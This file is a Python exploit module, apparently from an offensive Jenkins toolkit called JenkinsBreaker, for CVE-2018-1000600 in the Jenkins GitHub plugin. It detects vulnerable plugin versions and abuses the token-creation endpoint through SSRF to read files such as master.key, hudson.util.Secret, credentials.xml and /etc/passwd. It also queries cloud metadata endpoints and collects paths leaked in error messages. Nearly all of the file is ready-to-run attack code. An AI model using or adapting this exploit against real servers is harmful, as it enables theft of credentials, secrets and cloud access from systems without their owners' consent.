"""
CVE-2018-1000600: Jenkins GitHub Plugin Arbitrary File Read

This vulnerability abuses the GitHub plugin's token creation endpoint to read
arbitrary files from the Jenkins controller filesystem via SSRF.
"""

import requests
import re
from urllib.parse import quote
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2018-1000600"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins GitHub Plugin Arbitrary File Read",
    description="SSRF via GitHub plugin allowing arbitrary file read from controller filesystem",
    affected_versions=["GitHub Plugin <= 1.29.1"],
    mitre_attack=["T1005", "T1552.001", "T1083"],
    severity="high",
    references=[
        "https://www.jenkins.io/security/advisory/2018-07-18/",
        "https://nvd.nist.gov/vuln/detail/CVE-2018-1000600",
        "https://securityboulevard.com/2019/03/jenkins-cve-2018-1000600-poc"
    ],
    requires_auth=False,
    requires_crumb=False,
    tags=["file-read", "ssrf", "github-plugin"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance has vulnerable GitHub plugin.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable GitHub plugin detected, False otherwise
    """
    try:
        r = requests.get(
            f"{tool.jenkins_url}/pluginManager/api/json?depth=1",
            auth=tool.auth if tool.auth else None,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            plugins = data.get('plugins', [])
            
            for plugin in plugins:
                if 'github' in plugin.get('shortName', '').lower():
                    version = plugin.get('version', '')
                    console.print(f"[cyan][*] GitHub Plugin detected: version {version}[/cyan]")
                    
                    try:
                        version_parts = version.split('.')
                        if len(version_parts) >= 2:
                            major = int(version_parts[0])
                            minor = int(version_parts[1])
                            
                            if major == 1 and minor <= 29:
                                return True
                    except:
                        return True
        
        return False
    except:
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2018-1000600 for arbitrary file read via SSRF.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Not used for this exploit
        lport: Not used for this exploit
        **kwargs: Additional arguments (target_file to read)
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (GitHub Plugin File Read)...[/yellow]")
    
    target_files = kwargs.get('target_files', [
        '/etc/passwd',
        '/var/jenkins_home/secrets/master.key',
        '/var/jenkins_home/secrets/hudson.util.Secret',
        '/var/jenkins_home/credentials.xml',
        '/var/jenkins_home/config.xml',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\jenkins\\secrets\\master.key'
    ])
    
    if isinstance(target_files, str):
        target_files = [target_files]
    
    read_files = []
    
    vulnerable_endpoints = [
        '/descriptorByName/com.cloudbees.jenkins.GitHubPushTrigger/GitHubTokenCredentialsCreator/createTokenByPassword',
        '/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword',
        '/descriptor/org.jenkinsci.plugins.github.config.GitHubServerConfig/GitHubTokenCredentialsCreator/createTokenByPassword'
    ]
    
    for target_file in target_files:
        console.print(f"[cyan][*] Attempting to read: {target_file}[/cyan]")
        
        file_url_variants = [
            f"file://{target_file}",
            f"file:///{target_file}",
            f"file://localhost{target_file}",
        ]
        
        for endpoint in vulnerable_endpoints:
            for file_url in file_url_variants:
                try:
                    exploit_url = f"{tool.jenkins_url}{endpoint}?apiUrl={quote(file_url)}"
                    
                    headers = {**tool.custom_headers}
                    
                    r = requests.get(
                        exploit_url,
                        auth=tool.auth if tool.auth else None,
                        headers=headers,
                        proxies=tool.proxies,
                        verify=False,
                        timeout=10,
                        allow_redirects=True
                    )
                    
                    if r.status_code == 200:
                        content = r.text
                        
                        if len(content) > 0 and '<html' not in content.lower()[:100]:
                            if 'root:' in content or 'jenkins' in content or len(content) > 20:
                                read_files.append({
                                    "file": target_file,
                                    "endpoint": endpoint,
                                    "size": len(content),
                                    "preview": content[:300] + "..." if len(content) > 300 else content
                                })
                                console.print(f"[green][+] Successfully read {target_file} ({len(content)} bytes)[/green]")
                                break
                    
                    elif r.status_code in [400, 500]:
                        error_patterns = [
                            r'FileNotFoundException.*?([^\s]+)',
                            r'No such file.*?([^\s]+)',
                            r'Access denied.*?([^\s]+)',
                        ]
                        
                        for pattern in error_patterns:
                            match = re.search(pattern, r.text, re.IGNORECASE)
                            if match:
                                console.print(f"[yellow][!] Error accessing {target_file}: {match.group(0)}[/yellow]")
                                break
                
                except Exception as e:
                    console.print(f"[yellow][!] Error with {endpoint}: {str(e)[:50]}[/yellow]")
            
            if any(f["file"] == target_file for f in read_files):
                break
    
    try:
        console.print("[cyan][*] Attempting SSRF to internal metadata service...[/cyan]")
        
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        
        for endpoint in vulnerable_endpoints[:1]:
            for metadata_url in metadata_urls:
                try:
                    exploit_url = f"{tool.jenkins_url}{endpoint}?apiUrl={quote(metadata_url)}"
                    
                    r = requests.get(
                        exploit_url,
                        auth=tool.auth if tool.auth else None,
                        headers=tool.custom_headers,
                        proxies=tool.proxies,
                        verify=False,
                        timeout=5
                    )
                    
                    if r.status_code == 200 and len(r.text) > 0:
                        read_files.append({
                            "file": metadata_url,
                            "type": "ssrf_metadata",
                            "size": len(r.text),
                            "preview": r.text[:200]
                        })
                        console.print(f"[green][+] SSRF successful to {metadata_url}[/green]")
                        break
                except:
                    pass
    
    except Exception as e:
        console.print(f"[yellow][!] Metadata SSRF failed: {e}[/yellow]")
    
    try:
        console.print("[cyan][*] Attempting directory listing via error messages...[/cyan]")
        
        for endpoint in vulnerable_endpoints[:1]:
            test_url = f"{tool.jenkins_url}{endpoint}?apiUrl=file:///var/jenkins_home/"
            
            r = requests.get(
                test_url,
                auth=tool.auth if tool.auth else None,
                headers=tool.custom_headers,
                proxies=tool.proxies,
                verify=False,
                timeout=5
            )
            
            if 'is a directory' in r.text or 'FileNotFoundException' in r.text:
                path_matches = re.findall(r'/[a-zA-Z0-9/_.-]+', r.text)
                if path_matches:
                    console.print(f"[green][+] Potential paths discovered from errors: {len(set(path_matches))}[/green]")
                    read_files.append({
                        "type": "path_disclosure",
                        "paths": list(set(path_matches))[:10]
                    })
    
    except Exception as e:
        console.print(f"[yellow][!] Path enumeration failed: {e}[/yellow]")
    
    if read_files:
        console.print(f"[green][+] Successfully exploited CVE-2018-1000600: {len(read_files)} reads[/green]")
        return ExploitResult(
            exploit=CVE_ID,
            status="success",
            details=f"Arbitrary file read successful, accessed {len(read_files)} resources",
            data={
                "files_read": len(read_files),
                "files": read_files
            }
        )
    else:
        console.print("[yellow][-] File read attempts unsuccessful (may be patched or plugin not installed)[/yellow]")
        return ExploitResult(
            exploit=CVE_ID,
            status="not_vulnerable",
            details="Could not exploit GitHub plugin SSRF vulnerability"
        )
